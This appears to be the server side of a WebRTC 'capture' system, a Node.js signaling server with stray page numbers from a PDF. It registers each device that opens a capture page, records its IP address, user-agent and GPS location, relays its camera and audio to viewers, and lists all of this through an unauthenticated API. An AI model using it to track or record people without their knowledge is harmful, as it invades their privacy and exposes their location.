// Minimal Express + WebSocket signaling server for WebRTC capture system
// Author: Yasir's helper
const express = require('express');
const http = require('http');
const path = require('path');
const helmet = require('helmet');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const WebSocket = require('ws');
require('dotenv').config();
const app = express();
app.use(helmet());
app.use(cors());
app.use(express.json());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: '/ws' });
// In-memory user store (resets on server restart). For persistence, use DB.
let nextUserId = 1;
const users = new Map(); // userId -> { id, createdAt, lastSeen, ip, ua, 
status, loc, hasVideo, hasAudio }
// Mapping sockets for signaling
const publishers = new Map(); // userId -> ws
2
const viewers = new Map(); // userId -> Set<ws>
function now() { return new Date().toISOString(); }
function publicUser(u) {
// sanitize user for API response
return {
id: u.id,
createdAt: u.createdAt,
lastSeen: u.lastSeen,
ip: u.ip,
ua: u.ua,
status: u.status || 'offline',
hasVideo: !!u.hasVideo,
hasAudio: !!u.hasAudio,
loc: u.loc || null
};
}
// --- API ---
app.post('/api/register', (req, res) => {
// Assign next user number to the device opening capture.html
const id = nextUserId++;
const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
req.socket.remoteAddress;
const ua = req.headers['user-agent'] || '';
const user = {
id,
createdAt: now(),
lastSeen: now(),
ip,
ua,
status: 'registered',
hasVideo: false,
hasAudio: false,
loc: null
};
users.set(id, user);
res.json({ ok: true, id, ip });
});
app.get('/api/users', (req, res) => {
const list = Array.from(users.values()).sort((a,b) => a.id -
b.id).map(publicUser);
res.json({ ok: true, users: list });
});
app.get('/api/user/:id', (req, res) => {
const id = Number(req.params.id);
const u = users.get(id);
if (!u) return res.status(404).json({ ok:false, error:'Not found' });
3
res.json({ ok: true, user: publicUser(u) });
});
// Static site
app.use(express.static(path.join(__dirname, 'public'), { extensions:
['html'] }));
// --- WebSocket signaling protocol ---
// Roles: publisher (Phone-1) & viewer (Phone-2/Desktop)
// Viewer creates offer -> server -> publisher; publisher answers -> server -
> that viewer
wss.on('connection', (ws, req) => {
const params = new URLSearchParams((req.url || '').split('?')[1]);
const role = params.get('role'); // 'publisher' or 'viewer'
const userId = Number(params.get('userId')) || 0;
ws.id = uuidv4();
ws.role = role;
ws.userId = userId;
if (!userId || !['publisher','viewer'].includes(role)) {
ws.close(1008, 'Invalid params');
return;
}
const u = users.get(userId);
if (!u) {
users.set(userId, { id:userId, createdAt: now(), lastSeen: now(), ip:
req.socket.remoteAddress, ua:'', status:'unknown' });
}
if (role === 'publisher') {
publishers.set(userId, ws);
viewers.set(userId, viewers.get(userId) || new Set());
const u = users.get(userId) || { id:userId };
u.status = 'online';
u.lastSeen = now();
users.set(userId, u);
} else if (role === 'viewer') {
if (!viewers.get(userId)) viewers.set(userId, new Set());
viewers.get(userId).add(ws);
}
ws.on('message', (raw) => {
let msg;
try { msg = JSON.parse(raw.toString()); } catch { return; }
// Update last seen
const u = users.get(userId);
if (u) { u.lastSeen = now(); users.set(userId, u); }
4
// Routing logic
if (msg.type === 'viewer-offer') {
// Forward viewer SDP to publisher
const pub = publishers.get(userId);
if (pub && pub.readyState === WebSocket.OPEN) {
pub.send(JSON.stringify({
type: 'viewer-offer',
fromViewer: ws.id,
sdp: msg.sdp
}));
}
} else if (msg.type === 'publisher-answer') {
// Forward answer back to that specific viewer
const viewersSet = viewers.get(userId) || new Set();
for (const v of viewersSet) {
if (v.id === msg.toViewer && v.readyState === WebSocket.OPEN) {
v.send(JSON.stringify({ type:'publisher-answer', sdp: msg.sdp }));
}
}
} else if (msg.type === 'ice' && msg.role && msg.to) {
// Generic ICE routing
if (msg.role === 'viewer') {
const pub = publishers.get(userId);
if (pub && pub.readyState === WebSocket.OPEN) {
pub.send(JSON.stringify({ type:'ice', fromViewer: ws.id,
candidate: msg.candidate }));
}
} else if (msg.role === 'publisher') {
const viewersSet = viewers.get(userId) || new Set();
for (const v of viewersSet) {
if (v.id === msg.to && v.readyState === WebSocket.OPEN) {
v.send(JSON.stringify({ type:'ice', candidate: msg.candidate }));
}
}
}
} else if (msg.type === 'status') {
// Publisher status updates (hasVideo/hasAudio)
const u = users.get(userId) || { id:userId };
if (typeof msg.hasVideo === 'boolean') u.hasVideo = msg.hasVideo;
if (typeof msg.hasAudio === 'boolean') u.hasAudio = msg.hasAudio;
u.status = 'online';
u.lastSeen = now();
users.set(userId, u);
// fan-out to viewers (optional)
const vs = viewers.get(userId) || new Set();
for (const v of vs) if (v.readyState === WebSocket.OPEN)
v.send(JSON.stringify({ type:'status', user: publicUser(u) }));
} else if (msg.type === 'location') {
// Publisher location update
const u = users.get(userId) || { id:userId };
5
u.loc = { lat: msg.lat, lon: msg.lon, acc: msg.acc, ts: msg.ts };
u.lastSeen = now();
users.set(userId, u);
// broadcast to viewers
const vs = viewers.get(userId) || new Set();
for (const v of vs) if (v.readyState === WebSocket.OPEN)
v.send(JSON.stringify({ type:'location', ...u.loc }));
} else if (msg.type === 'command') {
// Viewer command to control publisher tracks (mute/unmute etc.)
const pub = publishers.get(userId);
if (pub && pub.readyState === WebSocket.OPEN) {
pub.send(JSON.stringify({ type:'command', action: msg.action }));
}
}
});
ws.on('close', () => {
if (role === 'publisher') {
publishers.delete(userId);
const u = users.get(userId);
if (u) { u.status = 'offline'; u.lastSeen = now(); users.set(userId,
u); }
// notify viewers
const vs = viewers.get(userId) || new Set();
for (const v of vs) if (v.readyState === WebSocket.OPEN)
v.send(JSON.stringify({ type:'status', user:
publicUser(users.get(userId)) }));
} else if (role === 'viewer') {
const set = viewers.get(userId);
if (set) set.delete(ws);
}
});
});
const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
console.log('Server listening on port', PORT);
});
